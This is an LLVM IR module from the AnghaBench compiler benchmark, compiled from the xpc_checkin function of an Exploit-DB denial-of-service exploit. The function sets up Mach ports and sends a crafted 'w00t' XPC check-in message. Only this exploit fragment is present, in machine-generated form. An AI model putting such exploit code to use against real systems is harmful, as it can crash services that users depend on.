; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_46297.c_xpc_checkin.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_46297.c_xpc_checkin.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.xpc_w00t = type { %struct.TYPE_9__, %struct.TYPE_8__, %struct.TYPE_7__, %struct.TYPE_6__ }
%struct.TYPE_9__ = type { i32, i8, i8*, i32 }
%struct.TYPE_8__ = type { i8*, i32, i8* }
%struct.TYPE_7__ = type { i8*, i32, i8* }
%struct.TYPE_6__ = type { i32 }

@MACH_PORT_RIGHT_RECEIVE = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [28 x i8] c"port allocation failed: %s\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_MAKE_SEND = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"port right insertion failed: %s\0A\00", align 1
@MACH_MSG_TYPE_COPY_SEND = common dso_local global i32 0, align 4
@MACH_MSGH_BITS_COMPLEX = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_MOVE_RECEIVE = common dso_local global i32 0, align 4
@MACH_MSG_PORT_DESCRIPTOR = common dso_local global i8* null, align 8
@MACH_SEND_MSG = common dso_local global i32 0, align 4
@MACH_MSG_OPTION_NONE = common dso_local global i32 0, align 4
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@MACH_MSG_TIMEOUT_NONE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [30 x i8] c"w00t message send failed: %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"sent xpc w00t message\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (i32 (i8*, i8**, i8**)* @xpc_checkin to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal i32 @xpc_checkin(i8* %0, i8** %1, i8** %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i8**, align 8
  %7 = alloca i64, align 8
  %8 = alloca %struct.xpc_w00t, align 8
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i8** %2, i8*** %6, align 8
  %9 = call i32 (...) @mach_task_self()
  %10 = load i32, i32* @MACH_PORT_RIGHT_RECEIVE, align 4
  %11 = load i8**, i8*** %5, align 8
  %12 = call i64 @mach_port_allocate(i32 %9, i32 %10, i8** %11)
  store i64 %12, i64* %7, align 8
  %13 = load i64, i64* %7, align 8
  %14 = load i64, i64* @KERN_SUCCESS, align 8
  %15 = icmp ne i64 %13, %14
  br i1 %15, label %16, label %22

16:                                               ; preds = %3
  %17 = load i64, i64* %7, align 8
  %18 = call i8* @mach_error_string(i64 %17)
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i8* %18)
  %20 = load i32, i32* @EXIT_FAILURE, align 4
  %21 = call i32 @exit(i32 %20) #3
  unreachable

22:                                               ; preds = %3
  %23 = call i32 (...) @mach_task_self()
  %24 = load i8**, i8*** %5, align 8
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i8*, i8** %26, align 8
  %28 = load i32, i32* @MACH_MSG_TYPE_MAKE_SEND, align 4
  %29 = call i64 @mach_port_insert_right(i32 %23, i8* %25, i8* %27, i32 %28)
  store i64 %29, i64* %7, align 8
  %30 = load i64, i64* %7, align 8
  %31 = load i64, i64* @KERN_SUCCESS, align 8
  %32 = icmp ne i64 %30, %31
  br i1 %32, label %33, label %39

33:                                               ; preds = %22
  %34 = load i64, i64* %7, align 8
  %35 = call i8* @mach_error_string(i64 %34)
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i8* %35)
  %37 = load i32, i32* @EXIT_FAILURE, align 4
  %38 = call i32 @exit(i32 %37) #3
  unreachable

39:                                               ; preds = %22
  %40 = call i32 (...) @mach_task_self()
  %41 = load i32, i32* @MACH_PORT_RIGHT_RECEIVE, align 4
  %42 = load i8**, i8*** %6, align 8
  %43 = call i64 @mach_port_allocate(i32 %40, i32 %41, i8** %42)
  store i64 %43, i64* %7, align 8
  %44 = load i64, i64* %7, align 8
  %45 = load i64, i64* @KERN_SUCCESS, align 8
  %46 = icmp ne i64 %44, %45
  br i1 %46, label %47, label %53

47:                                               ; preds = %39
  %48 = load i64, i64* %7, align 8
  %49 = call i8* @mach_error_string(i64 %48)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0), i8* %49)
  %51 = load i32, i32* @EXIT_FAILURE, align 4
  %52 = call i32 @exit(i32 %51) #3
  unreachable

53:                                               ; preds = %39
  %54 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %55 = call i32 @memset(%struct.TYPE_9__* %54, i32 0, i32 80)
  %56 = load i32, i32* @MACH_MSG_TYPE_COPY_SEND, align 4
  %57 = load i32, i32* @MACH_MSGH_BITS_COMPLEX, align 4
  %58 = call i32 @MACH_MSGH_BITS_SET(i32 %56, i32 0, i32 0, i32 %57)
  %59 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %60 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %59, i32 0, i32 3
  store i32 %58, i32* %60, align 8
  %61 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %62 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %61, i32 0, i32 0
  store i32 80, i32* %62, align 8
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %65 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %64, i32 0, i32 2
  store i8* %63, i8** %65, align 8
  %66 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %67 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %66, i32 0, i32 1
  store i8 116, i8* %67, align 4
  %68 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 3
  %69 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %68, i32 0, i32 0
  store i32 2, i32* %69, align 8
  %70 = load i8**, i8*** %5, align 8
  %71 = load i8*, i8** %70, align 8
  %72 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 2
  %73 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %72, i32 0, i32 2
  store i8* %71, i8** %73, align 8
  %74 = load i32, i32* @MACH_MSG_TYPE_MOVE_RECEIVE, align 4
  %75 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 2
  %76 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %75, i32 0, i32 1
  store i32 %74, i32* %76, align 8
  %77 = load i8*, i8** @MACH_MSG_PORT_DESCRIPTOR, align 8
  %78 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 2
  %79 = getelementptr inbounds %struct.TYPE_7__, %struct.TYPE_7__* %78, i32 0, i32 0
  store i8* %77, i8** %79, align 8
  %80 = load i8**, i8*** %6, align 8
  %81 = load i8*, i8** %80, align 8
  %82 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 1
  %83 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %82, i32 0, i32 2
  store i8* %81, i8** %83, align 8
  %84 = load i32, i32* @MACH_MSG_TYPE_MAKE_SEND, align 4
  %85 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 1
  %86 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %85, i32 0, i32 1
  store i32 %84, i32* %86, align 8
  %87 = load i8*, i8** @MACH_MSG_PORT_DESCRIPTOR, align 8
  %88 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 1
  %89 = getelementptr inbounds %struct.TYPE_8__, %struct.TYPE_8__* %88, i32 0, i32 0
  store i8* %87, i8** %89, align 8
  %90 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %91 = load i32, i32* @MACH_SEND_MSG, align 4
  %92 = load i32, i32* @MACH_MSG_OPTION_NONE, align 4
  %93 = or i32 %91, %92
  %94 = getelementptr inbounds %struct.xpc_w00t, %struct.xpc_w00t* %8, i32 0, i32 0
  %95 = getelementptr inbounds %struct.TYPE_9__, %struct.TYPE_9__* %94, i32 0, i32 0
  %96 = load i32, i32* %95, align 8
  %97 = load i32, i32* @MACH_PORT_NULL, align 4
  %98 = load i32, i32* @MACH_MSG_TIMEOUT_NONE, align 4
  %99 = load i32, i32* @MACH_PORT_NULL, align 4
  %100 = call i64 @mach_msg(%struct.TYPE_9__* %90, i32 %93, i32 %96, i32 0, i32 %97, i32 %98, i32 %99)
  store i64 %100, i64* %7, align 8
  %101 = load i64, i64* %7, align 8
  %102 = load i64, i64* @KERN_SUCCESS, align 8
  %103 = icmp ne i64 %101, %102
  br i1 %103, label %104, label %110

104:                                              ; preds = %53
  %105 = load i64, i64* %7, align 8
  %106 = call i8* @mach_error_string(i64 %105)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.2, i64 0, i64 0), i8* %106)
  %108 = load i32, i32* @EXIT_FAILURE, align 4
  %109 = call i32 @exit(i32 %108) #3
  unreachable

110:                                              ; preds = %53
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  br label %112

112:                                              ; preds = %110
  ret i32 1
}

declare dso_local i64 @mach_port_allocate(i32, i32, i8**) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @mach_error_string(i64) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @mach_port_insert_right(i32, i8*, i8*, i32) #1

declare dso_local i32 @memset(%struct.TYPE_9__*, i32, i32) #1

declare dso_local i32 @MACH_MSGH_BITS_SET(i32, i32, i32, i32) #1

declare dso_local i64 @mach_msg(%struct.TYPE_9__*, i32, i32, i32, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
